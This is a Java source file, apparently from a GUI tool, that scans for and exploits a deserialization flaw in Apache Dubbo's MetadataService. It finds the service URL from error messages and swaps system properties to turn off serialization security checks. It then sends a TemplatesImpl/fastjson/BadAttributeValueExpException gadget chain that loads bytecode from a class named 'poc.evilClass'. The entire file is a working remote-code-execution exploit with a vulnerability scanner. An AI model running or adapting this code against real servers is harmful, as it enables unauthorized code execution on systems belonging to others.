package exploit;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.dubbo.common.config.ReferenceCache;
import org.apache.dubbo.common.io.UnsafeByteArrayOutputStream;
import org.apache.dubbo.common.logger.support.FailsafeLogger;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.config.ReferenceConfigBase;
import org.apache.dubbo.config.utils.SimpleReferenceCache;
import org.apache.dubbo.rpc.service.GenericService;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class InsertCode extends Thread {

    private static final String RAW = "raw.return";
    private static final String NATIVE_JAVA = "nativejava";
    private String targetIp;
    private Integer targetPort;
    private JTextArea out;
    private String url="";
    private String interFace = "org.apache.dubbo.metadata.MetadataService";
    private String method = "getMetadataInfo";
    private String version ="1.0.0";

    private String base = "";
    public String getFullUrl(){
        return this.url+":"+this.version;
    }
    public InsertCode(String targetIp, Integer targetPort, JTextArea jTextArea) {
        this.targetIp = targetIp;
        this.targetPort = targetPort;
        this.out = jTextArea;
        this.base = String.format("dubbo://%s:%d/", this.targetIp, this.targetPort);
        FailsafeLogger.setDisabled(true);
    }

    private static Map getInstance() throws IOException {
        HashMap map = new HashMap();
        map.put("class", "java.time.zone.TzdbZoneRulesProvider");
        return map;
    }

    private static Map getProperties() throws IOException {
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
        properties.setProperty("serialization.security.check", "false");
        HashMap map = new HashMap();
        map.put("class", "java.lang.System");
        map.put("properties", properties);
        return map;
    }


    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    private String getGroup(){
        Pattern pattern = Pattern.compile("dubbo://"+targetIp+":"+targetPort+ "/(.*)/org.apache.dubbo.metadata.MetadataService");
        Matcher m  =pattern.matcher(url);
        if (m.find()){
            return m.group(1);
        }
        return  "";
    }
    public synchronized GenericService getGenericService(String generic) {
        GenericService genericService;
        ReferenceConfig referenceConfig;
        String tmpUrl = base + "org.apache.dubbo.metadata.MetadataService";
        String group = getGroup();
        referenceConfig = new ReferenceConfig<>();
        referenceConfig.setRetries(0);
        referenceConfig.setApplication(new ApplicationConfig("test"));
        referenceConfig.setInterface(this.interFace);
        referenceConfig.setGeneric(generic);
        referenceConfig.setVersion(this.version);
        referenceConfig.setUrl(tmpUrl);
        if (!group.isEmpty()) {
            referenceConfig.setGroup(group);
        }
        SimpleReferenceCache.KeyGenerator keyGenerator = referenceConfig1 -> referenceConfig1.getUrl()+ referenceConfig1.getGroup()+ referenceConfig1.getGeneric();
        ReferenceCache referenceCache  = SimpleReferenceCache.getCache(tmpUrl,keyGenerator);
        genericService = (GenericService) referenceCache.get(referenceConfig);
        return genericService;
    }



    public  String sendPoc(Object obj, String generic) throws Exception {
        try {
            Object[] args;
            GenericService genericService = getGenericService(generic);
            if (obj != null) {
                args = new Object[]{obj};
            } else {
                args = new Object[]{};
            }
            try {
                genericService.$invoke(this.method, new String[]{"java.lang.String"}, args);
            } catch (org.apache.dubbo.rpc.RpcException e) {
                if (this.url.isEmpty()) {
                    String regex = "Not found exported service: .*?\\[(.*?)\\], may be version";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(e.toString());
                    if (matcher.find()) {
                        String result = matcher.group(1);
                        String[] lines = result.split(",");
                        for (String line : lines) {
                            if (line.contains("org.apache.dubbo.metadata.MetadataService")) {
                                String[] arr = line.split(":");
                                line = String.join(":", Arrays.copyOf(arr, arr.length - 2));
                                this.url = base + line.replace(" ","");
                                if (this.out!=null) {
                                    this.out.append("成功获取到MetadataService URL:\n" + this.url);
                                }
//                                System.out.println("成功获取到MetadataService URL:\n" + this.url);
                            }
                        }
                    }
                }else{
                    return e.toString();
                }

            }
        }catch (ConcurrentModificationException e){
            e.printStackTrace();

        }
        catch (Exception e){
            return e.toString();
        }


        return "";
    }

    public static Object getObject() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get("poc.evilClass");
        clazz.getClassFile().setMajorVersion(51);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "");
        setValue(templates, "_tfactory", null);


        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setValue(val,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,val);

        NativeJavaSerialization nativeJavaSerialization = new NativeJavaSerialization();
        UnsafeByteArrayOutputStream unsafeByteArrayOutputStream = new UnsafeByteArrayOutputStream();
        ObjectOutput o = nativeJavaSerialization.serialize(null, unsafeByteArrayOutputStream);
        o.writeObject(hashMap);
        return unsafeByteArrayOutputStream.toByteArray();
    }

    public void exploit()  {
        try {
            sendPoc(null, RAW);// 获取方法路径
            sendPoc(getInstance(), RAW);// 加载java.time.zone.TzdbZoneRulesProvider Instance
            sendPoc(getProperties(), RAW);// 替换系统Properties
            sendPoc(getObject(), NATIVE_JAVA);// 发送恶意字节码

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public boolean scan()  {
        try {
            sendPoc(null, RAW);
            if (!this.url.isEmpty()) {
                String ret = sendPoc(getInstance(), RAW);
                if (ret.contains("java.lang.ClassCastException: java.time.zone.TzdbZoneRulesProvider cannot be cast to java.lang.String")) {
                    return true;
                }

            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

    @Override
    public void run() {
        try {
            System.out.println("开始扫描"+targetIp+":"+targetPort);
            if(this.scan()){
                System.out.println(String.format("[+]%s:%s存在漏洞",this.targetIp,this.targetPort));
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {

        new InsertCode("127.0.0.1",20880,null).exploit();
    }
}
